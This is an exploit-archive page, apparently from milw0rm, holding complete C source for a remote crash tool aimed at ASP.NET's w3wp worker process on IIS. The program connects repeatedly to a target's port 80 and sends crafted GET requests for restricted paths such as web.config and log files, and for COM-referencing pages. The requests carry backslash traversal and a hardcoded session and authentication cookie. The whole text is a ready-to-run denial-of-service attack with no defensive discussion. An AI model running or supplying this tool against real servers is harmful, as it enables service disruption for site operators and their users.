<html><head><title>ASP.NET w3wp (COM Components) Remote Crash Exploit</title></head><pre>// w3wp-dos.c
//

#include &quot;stdafx.h&quot;

#pragma comment (lib,&quot;ws2_32&quot;)

#include &lt;winsock2.h&gt;
#include &lt;windows.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;
#include &lt;ctype.h&gt;

char * pszUnauthLinks(DWORD);

#define portno	80

int main(int argc, CHAR* argv[])
{
	char	szWorkBuff[100];
	DWORD	dwCount = 0, dwCounter;
	int	iCnt = 0, iCount = 0;

	SOCKET	conn_socket; 
	WSADATA wsaData;
	struct	sockaddr_in sin;
	struct	hostent *phostent;
	char	*pszTargetHost = new char[MAX_PATH]; 
	UINT	uAddr; 

	if (argc&lt;2)
	{
		printf(&quot;============================================\n&quot;);
		printf(&quot;\t\t w3wp-dos by Debasis Mohanty\n&quot;);
		printf(&quot;\t\t www.hackingspirits.com\n&quot;);
		printf(&quot;============================================\n&quot;);

		printf(&quot;\nUsage: w3wpdos &lt;HostIP / HostName&gt; \n\n&quot;);

		exit(0);
	}

	int iRetval; 
	if((iRetval = WSAStartup(0x202,&amp;wsaData)) != 0) {
		printf( &quot;WSAStartup failed with error %d\n&quot;,iRetval);
		WSACleanup(); exit(1); }

	// Make a check on the length of the parameter provided
	if (strlen(argv[1]) &gt; MAX_PATH)	{ 
		printf( &quot;Too long parameter ....\n&quot;); exit(1); }
	else
		strcpy(pszTargetHost, argv[1]);

	// Resolve the hostname into IP address or vice-versa
	if(isalpha(pszTargetHost[0])) 
		phostent = gethostbyname(pszTargetHost);
	else  { 
		uAddr = inet_addr(pszTargetHost);
		phostent = gethostbyaddr((char *)&amp;uAddr,4,AF_INET);

		if(phostent != NULL)
			wsprintf( pszTargetHost, &quot;[+] %s&quot;, phostent-&gt;h_name);
		else	{
			printf( &quot;Failed to resolve IP address, please provide host name.\n&quot; );
			WSACleanup();
			exit(1);	
		}
	}

	if (phostent == NULL )	{
		printf(&quot;Cannot resolve address [%s]: Error %d\n&quot;, pszTargetHost, 
			WSAGetLastError());

		WSACleanup();
		printf( &quot;Target host seems to be down or the program failed to resolve host name.&quot;);
		printf( &quot;Press enter to exit&quot; );

		getchar();
		exit(1); }

	// Initialise Socket info
	memset(&amp;sin,0,sizeof(sin));
	memcpy(&amp;(sin.sin_addr),phostent-&gt;h_addr,phostent-&gt;h_length);
	sin.sin_family = phostent-&gt;h_addrtype;
	sin.sin_port = htons(portno);

	conn_socket = socket(AF_INET, SOCK_STREAM, 0); 
	if (conn_socket &lt; 0 )	{
		printf(&quot;Error Opening socket: Error %d\n&quot;, WSAGetLastError());
		WSACleanup();

		return -1;}

	printf(&quot;============================================\n&quot;);
	printf(&quot;\t\t w3wp-dos by Debasis Mohanty\n&quot;);
	printf(&quot;\t\t www.hackingspirits.com\n&quot;);
	printf(&quot;============================================\n&quot;);

	printf(&quot;[+] Host name: %s\n&quot;, pszTargetHost);
	wsprintf( szWorkBuff, &quot;%u.%u.%u.%u&quot;, 
		sin.sin_addr.S_un.S_un_b.s_b1,
		sin.sin_addr.S_un.S_un_b.s_b2,
		sin.sin_addr.S_un.S_un_b.s_b3,
		sin.sin_addr.S_un.S_un_b.s_b4 );
	printf(&quot;[+] Host IP: %s\n&quot;, szWorkBuff);

	closesocket(conn_socket);

	printf(&quot;[+] Ready to generate requests\n&quot;);

	/* The count should be modified depending upon the 
	number of links in the szBuff array	*/
	while(dwCount++ &lt; 10) 
	{						

		conn_socket = socket(AF_INET, SOCK_STREAM, 0);
		memcpy(phostent-&gt;h_addr, (char *)&amp;sin.sin_addr, phostent-&gt;h_length);
		sin.sin_family = AF_INET;
		sin.sin_port = htons(portno);

		if(connect(conn_socket, (struct sockaddr*)&amp;sin,sizeof(sin))!=0)
			perror(&quot;connect&quot;);

		printf( &quot;[%i] %s&quot;, dwCount, pszUnauthLinks(dwCount));
		for(dwCounter=1;dwCounter &lt; 9;dwCounter++) 
		{
			send(conn_socket,pszUnauthLinks(dwCount), strlen(pszUnauthLinks(dwCount)),0);

			char *szBuffer = new char[256];
			recv(conn_socket, szBuffer, 256, 0);
			printf(&quot;.&quot;);
			// 			if( szBuffer != NULL) 
			//				printf(&quot;%s&quot;, szBuffer);
			delete szBuffer;
			Sleep(100);
		}
		printf(&quot;\n&quot;);
		closesocket(conn_socket);
	}

	return 1;
}


char * pszUnauthLinks( DWORD dwIndex )
{
	char	*szBuff[10];
	TCHAR	*szGetReqH = new char[1024]; 

	/*	Modify the list of links given below to your asp.net links. The list should carry links which refer to any COM components and as well as other restricted links under the asp.net app path. 	*/

	szBuff[1] = &quot;GET /aspnet-app\\web.config&quot;;
	szBuff[2] = &quot;GET /aspnet-app\\../aspnetlogs\\log1.logs&quot;;
	szBuff[3] = &quot;GET /aspnet-app\\default-userscreen.aspx&quot;;
	szBuff[4] = &quot;GET /aspnet-app\\users/config.aspx&quot;;
	szBuff[5] = &quot;GET /aspnet-app\\links/anycomref.aspx&quot;;	//
	szBuff[6] = &quot;GET /aspnet-app\\com-ref-link1.aspx&quot;;		// Links of pages referring 
	szBuff[7] = &quot;GET /aspnet-app\\com-ref-link2.aspx&quot;;		// COM components.
	szBuff[8] = &quot;GET /aspnet-app\\com-ref-link3.aspx&quot;;		//
	szBuff[9] = &quot;GET /aspnet-app\\com-ref-link4.aspx&quot;;		//

	/* Prepare the GET request for the desired link */
	strcpy(szGetReqH, szBuff[dwIndex]);
	strcat(szGetReqH, &quot; HTTP/1.1\r\n&quot;);
	strcat(szGetReqH, &quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n&quot;);
	strcat(szGetReqH, &quot;Accept-Language: en-us\r\n&quot;);
	strcat(szGetReqH, &quot;Accept-Encoding: gzip, deflate\r\n&quot;);
	strcat(szGetReqH, &quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)\r\n&quot;);
	strcat(szGetReqH, &quot;Host: \r\n&quot; );
	strcat(szGetReqH, &quot;Connection: Keep-Alive\r\n&quot; );

	/* Insert a valid Session Cookie and ASPVIEWSTATE to get more effective result */
	strcat(szGetReqH, &quot;Cookie: ASP.NET_SessionId=35i2i02dtybpvvjtog4lh0ri;\r\n&quot; );
	strcat(szGetReqH, &quot;.ASPXAUTH=6DCE135EFC40CAB2A3B839BF21012FC6C619EB88C866A914ED9F49D67B0D01135F744632F1CC480589912023FA6D703BF02680BE6D733518A998AD1BE1FCD082F1CBC4DB54870BFE76AC713AF05B971D\r\n\r\n&quot; );

	// return szBuff[dwIndex];
	return szGetReqH;
}

// milw0rm.com [2006-03-22]</pre></html>